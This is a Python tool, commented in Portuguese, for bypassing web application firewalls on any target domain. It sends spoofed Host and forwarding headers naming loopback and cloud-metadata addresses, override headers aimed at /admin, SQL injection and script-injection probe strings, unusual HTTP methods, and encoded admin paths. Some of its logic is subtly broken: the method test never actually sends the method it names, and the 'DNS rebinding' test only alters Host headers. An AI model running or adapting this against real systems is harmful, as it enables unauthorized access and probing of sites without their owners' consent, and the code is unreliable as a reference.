#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Advanced WAF Bypass Techniques
DNS rebinding, timing attacks, IPv6 abuse, and more
"""

import sys
import json
import time
import socket
import struct
import urllib.request
import urllib.error
import ssl
import re
import threading
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass
from datetime import datetime


@dataclass
class BypassResult:
    """Resultado de tentativa de bypass"""
    technique: str
    success: bool
    severity: str
    details: str = ""
    response_time: float = 0.0
    
    def to_dict(self) -> Dict:
        return {
            'technique': self.technique,
            'success': self.success,
            'severity': self.severity,
            'details': self.details,
            'response_time_ms': round(self.response_time * 1000, 2)
        }


class AdvancedWAFBypass:
    """Técnicas avançadas de bypass de WAF"""
    
    def __init__(self, target: str, timeout: int = 10):
        self.target = target
        self.timeout = timeout
        self.ctx = ssl.create_default_context()
        self.results = []
        
    def _make_request(self, url: str, headers: dict = None, timeout: int = None) -> Tuple[int, dict, float]:
        """Faz request com medição de tempo"""
        if headers is None:
            headers = {}
        
        start = time.time()
        try:
            req = urllib.request.Request(url, headers=headers)
            with urllib.request.urlopen(req, timeout=timeout or self.timeout, context=self.ctx) as resp:
                elapsed = time.time() - start
                return resp.status, dict(resp.headers), elapsed
        except urllib.error.HTTPError as e:
            elapsed = time.time() - start
            return e.code, dict(e.headers) if e.headers else {}, elapsed
        except Exception as e:
            elapsed = time.time() - start
            return 0, {}, elapsed
    
    def test_dns_rebinding(self) -> List[BypassResult]:
        """Testa DNS rebinding attack"""
        print("[1] Testing DNS Rebinding...")
        
        results = []
        
        # DNS rebinding requer um servidor DNS malicioso
        # Esta é uma verificação se o alvo é vulnerável a DNS rebinding
        
        # Verificar se o alvo responde a diferentes Host headers
        host_headers = [
            self.target,
            f"127.0.0.1.{self.target}",
            f"localhost.{self.target}",
            f"169.254.169.254.{self.target}",  # AWS metadata
        ]
        
        base_url = f"https://{self.target}"
        
        for host in host_headers:
            headers = {
                'Host': host,
                'User-Agent': 'Mozilla/5.0'
            }
            
            # Tentar acessar com Host header alterado
            try:
                # Criar request com Host customizado
                req = urllib.request.Request(base_url, headers=headers)
                resp = urllib.request.urlopen(req, timeout=self.timeout, context=self.ctx)
                
                # Se chegou aqui, o servidor pode estar vulnerável
                results.append(BypassResult(
                    technique="DNS Rebinding (Host Header)",
                    success=True,
                    severity="HIGH",
                    details=f"Host header: {host} accepted"
                ))
            except urllib.error.HTTPError as e:
                if e.code == 403:
                    results.append(BypassResult(
                        technique="DNS Rebinding (Host Header)",
                        success=False,
                        severity="LOW",
                        details=f"Host header blocked: {host}"
                    ))
            except Exception as e:
                results.append(BypassResult(
                    technique="DNS Rebinding (Host Header)",
                    success=False,
                    severity="INFO",
                    details=str(e)[:100]
                ))
        
        return results
    
    def test_ipv6_abuse(self) -> List[BypassResult]:
        """Testa IPv6 translation abuse"""
        print("\n[2] Testing IPv6 Translation Abuse...")
        
        results = []
        base_url = f"https://{self.target}"
        
        # IPv6 representations de 127.0.0.1
        ipv6_loopbacks = [
            '::1',
            '0:0:0:0:0:0:0:1',
            '0000:0000:0000:0000:0000:0000:0000:0001',
            '::ffff:127.0.0.1',
            '127.0.0.1',  # IPv4-mapped
        ]
        
        for ipv6 in ipv6_loopbacks:
            # Tentar acessar via IPv6
            try:
                # Modificar o host no request
                req = urllib.request.Request(base_url, headers={
                    'Host': ipv6,
                    'X-Forwarded-For': ipv6,
                    'X-Real-IP': ipv6,
                    'User-Agent': 'Mozilla/5.0'
                })
                status, headers, elapsed = self._make_request(base_url, req.headers)
                
                if status == 200:
                    results.append(BypassResult(
                        technique=f"IPv6 Abuse: {ipv6}",
                        success=True,
                        severity="HIGH",
                        details=f"IPv6 loopback accepted, response time: {elapsed*1000:.0f}ms"
                    ))
                else:
                    results.append(BypassResult(
                        technique=f"IPv6 Abuse: {ipv6}",
                        success=False,
                        severity="LOW",
                        details=f"IPv6 blocked (status {status})"
                    ))
            except Exception as e:
                results.append(BypassResult(
                    technique=f"IPv6 Abuse: {ipv6}",
                    success=False,
                    severity="INFO",
                    details=str(e)[:100]
                ))
        
        return results
    
    def test_timing_attack(self) -> List[BypassResult]:
        """Testa timing side-channel attack"""
        print("\n[3] Testing Timing Side-Channel...")
        
        results = []
        base_url = f"https://{self.target}"
        
        # Medir tempo de resposta para diferentes inputs
        test_inputs = [
            '',
            'a' * 10,
            'a' * 100,
            'a' * 1000,
            "' OR '1'='1",
            '<script>alert(1)</script>',
        ]
        
        timings = {}
        
        for inp in test_inputs:
            times = []
            for _ in range(3):  # Média de 3 tentativas
                url = f"{base_url}/search?q={inp}" if inp else base_url
                _, _, elapsed = self._make_request(url)
                times.append(elapsed)
            
            avg_time = sum(times) / len(times)
            timings[inp[:20]] = avg_time
        
        # Verificar variação significativa de tempo
        if timings:
            times = list(timings.values())
            time_variance = max(times) - min(times) if times else 0
            
            if time_variance > 0.1:  # Mais de 100ms de diferença
                results.append(BypassResult(
                    technique="Timing Side-Channel",
                    success=True,
                    severity="MEDIUM",
                    details=f"Time variance detected: {time_variance*1000:.0f}ms"
                ))
            else:
                results.append(BypassResult(
                    technique="Timing Side-Channel",
                    success=False,
                    severity="LOW",
                    details=f"Consistent response times ({time_variance*1000:.0f}ms variance)"
                ))
        
        return results
    
    def test_header_fuzzing(self) -> List[BypassResult]:
        """Testa headers incomuns para bypass"""
        print("\n[4] Testing Header Fuzzing...")
        
        results = []
        base_url = f"https://{self.target}"
        
        # Headers que podem confundir WAFs
        suspicious_headers = [
            ('X-Original-URL', '/admin'),
            ('X-Rewrite-URL', '/admin'),
            ('X-Custom-IP-Authorization', '127.0.0.1'),
            ('X-Forwarded-Host', 'internal.server'),
            ('X-Forwarded-Proto', 'https'),
            ('X-Forwarded-Port', '443'),
            ('X-Original-URL', '/admin'),
            ('X-WAF-Override', 'bypass'),
            ('CF-Connecting-IP', '127.0.0.1'),
            ('True-Client-IP', '127.0.0.1'),
        ]
        
        for header_name, header_value in suspicious_headers:
            headers = {
                header_name: header_value,
                'User-Agent': 'Mozilla/5.0',
                'X-Bypass-Test': '1'
            }
            
            status, resp_headers, elapsed = self._make_request(base_url, headers)
            
            # Verificar se o header foi processado
            if any(v.lower() == header_value.lower() for v in resp_headers.values()):
                results.append(BypassResult(
                    technique=f"Header: {header_name}",
                    success=True,
                    severity="MEDIUM",
                    details=f"Header echoed in response"
                ))
        
        return results
    
    def test_http_methods(self) -> List[BypassResult]:
        """Testa métodos HTTP incomuns"""
        print("\n[5] Testing HTTP Methods...")
        
        results = []
        base_url = f"https://{self.target}"
        
        methods = ['TRACE', 'TRACK', 'DEBUG', 'PATCH', 'PROPFIND', 'PROPPATCH', 'MKCOL', 'COPY', 'MOVE', 'LOCK', 'UNLOCK']
        
        for method in methods:
            try:
                req = urllib.request.Request(base_url, method=method, headers={'User-Agent': 'Mozilla/5.0'})
                status, headers, elapsed = self._make_request(base_url, headers={'User-Agent': 'Mozilla/5.0'})
                
                if status not in [405, 501]:  # Method Not Allowed ou Not Implemented
                    results.append(BypassResult(
                        technique=f"HTTP Method: {method}",
                        success=True,
                        severity="MEDIUM",
                        details=f"Method {method} returned {status}"
                    ))
                else:
                    results.append(BypassResult(
                        technique=f"HTTP Method: {method}",
                        success=False,
                        severity="LOW",
                        details=f"Method {method} blocked"
                    ))
            except Exception as e:
                results.append(BypassResult(
                    technique=f"HTTP Method: {method}",
                    success=False,
                    severity="INFO",
                    details=str(e)[:50]
                ))
        
        return results
    
    def test_url_encoding(self) -> List[BypassResult]:
        """Testa encoding variado para bypass"""
        print("\n[6] Testing URL Encoding...")
        
        results = []
        base_url = f"https://{self.target}"
        
        # Paths para testar
        test_paths = ['/admin', '/api/admin', '/dashboard']
        
        # Varianas de encoding
        encodings = [
            lambda p: p,  # Original
            lambda p: p.replace('/', '%2f'),
            lambda p: p.replace('/', '%2F'),
            lambda p: p.replace('/', '%252f'),  # Double encoding
            lambda p: p.replace('admin', '%61dmin'),
            lambda p: p.replace('admin', 'adm%69n'),
            lambda p: p.replace('admin', 'admi%n'),
        ]
        
        for path in test_paths:
            for i, enc_func in enumerate(encodings):
                encoded_path = enc_func(path)
                url = f"{base_url}{encoded_path}"
                
                status, _, elapsed = self._make_request(url)
                
                # Se o encoding variado retorna o mesmo que o original
                if status == 200 and i > 0:
                    results.append(BypassResult(
                        technique=f"URL Encoding (path={path})",
                        success=True,
                        severity="MEDIUM",
                        details=f"Encoding variant {i} works"
                    ))
                    break
        
        return results
    
    def run_all_bypasses(self) -> Dict:
        """Executa todos os testes de bypass"""
        print("=" * 60)
        print("  ADVANCED WAF BYPASS ENGINE")
        print("=" * 60)
        print()
        
        all_results = {
            'target': self.target,
            'timestamp': datetime.now().isoformat(),
            'techniques': [],
            'summary': {}
        }
        
        bypass_tests = [
            ("DNS Rebinding", self.test_dns_rebinding),
            ("IPv6 Abuse", self.test_ipv6_abuse),
            ("Timing Attack", self.test_timing_attack),
            ("Header Fuzzing", self.test_header_fuzzing),
            ("HTTP Methods", self.test_http_methods),
            ("URL Encoding", self.test_url_encoding),
        ]
        
        for name, test_func in bypass_tests:
            print(f"\n[{name}]")
            try:
                results = test_func()
                all_results['techniques'].extend([r.to_dict() for r in results])
            except Exception as e:
                print(f"  [ERROR] {e}")
        
        # Resumo
        successful = [r for r in all_results['techniques'] if r.get('success')]
        critical = [r for r in successful if r.get('severity') == 'CRITICAL']
        high = [r for r in successful if r.get('severity') == 'HIGH']
        medium = [r for r in successful if r.get('severity') == 'MEDIUM']
        
        all_results['summary'] = {
            'total_techniques': len(all_results['techniques']),
            'successful_bypasses': len(successful),
            'critical': len(critical),
            'high': len(high),
            'medium': len(medium),
            'recommendation': 'Manual testing required' if successful else 'WAF appears strong'
        }
        
        print("\n" + "=" * 60)
        print("  BYPASS SUMMARY")
        print("=" * 60)
        print(f"  Techniques tested: {all_results['summary']['total_techniques']}")
        print(f"  Successful bypasses: {all_results['summary']['successful_bypasses']}")
        print(f"  Critical: {all_results['summary']['critical']}")
        print(f"  High: {all_results['summary']['high']}")
        print(f"  Medium: {all_results['summary']['medium']}")
        print(f"  Recommendation: {all_results['summary']['recommendation']}")
        print("=" * 60)
        
        return all_results


def main():
    import argparse
    parser = argparse.ArgumentParser(description='Advanced WAF Bypass')
    parser.add_argument('target', help='Target domain')
    parser.add_argument('--output', '-o', help='Output file')
    
    args = parser.parse_args()
    
    bypass = AdvancedWAFBypass(args.target)
    result = bypass.run_all_bypasses()
    
    if args.output:
        with open(args.output, 'w') as f:
            json.dump(result, f, indent=2)
        print(f"\n[SAVE] Results saved to {args.output}")
    
    return result


if __name__ == "__main__":
    main()
